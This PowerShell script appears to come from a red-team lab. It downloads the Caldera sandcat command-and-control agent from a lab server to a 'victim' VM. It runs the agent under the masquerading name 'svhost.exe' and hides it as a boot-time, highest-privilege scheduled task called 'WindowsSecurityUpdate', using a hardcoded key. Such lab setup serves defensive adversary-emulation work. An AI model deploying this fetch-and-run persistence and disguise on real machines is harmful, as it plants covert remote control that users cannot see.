# deploy_caldera_agent.ps1
# One-shot: download sandcat from Caldera, run it, register as scheduled task.
# Run from C:\vagrant\scripts\ on win11-victim.

$CalderaServer = "http://192.168.56.30:8888"
$SandcatPath   = "C:\Users\Public\svhost.exe"
$TaskName      = "WindowsSecurityUpdate"

Start-Transcript -Path "C:\Windows\Temp\deploy-caldera-agent.log" -Force

# Stop any running instance so curl can overwrite the locked binary
$existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
if ($existingTask) {
    Write-Host "[caldera-agent] Stopping existing scheduled task before re-download..."
    Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}
Get-Process -Name "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

Write-Host "[caldera-agent] Downloading sandcat from $CalderaServer..."
& curl.exe -fsSL -o $SandcatPath `
    -H "file: sandcat.go-windows" `
    -H "KEY: ADMIN123" `
    "$CalderaServer/file/download" 2>$null

if ($LASTEXITCODE -ne 0) {
    Write-Host "[caldera-agent] ERROR: download failed (exit $LASTEXITCODE)"
    Stop-Transcript; exit 1
}

Write-Host "[caldera-agent] Downloaded OK. Registering scheduled task '$TaskName'..."
$Action   = New-ScheduledTaskAction -Execute $SandcatPath -Argument "-server $CalderaServer -group red"
$Trigger  = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 `
                -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger `
    -Settings $Settings -RunLevel Highest -Force | Out-Null

Write-Host "[caldera-agent] Starting sandcat via scheduled task (survives WinRM session close)..."
Start-ScheduledTask -TaskName $TaskName

Write-Host "[caldera-agent] Done. Agent running and scheduled at boot."
Stop-Transcript
exit 0
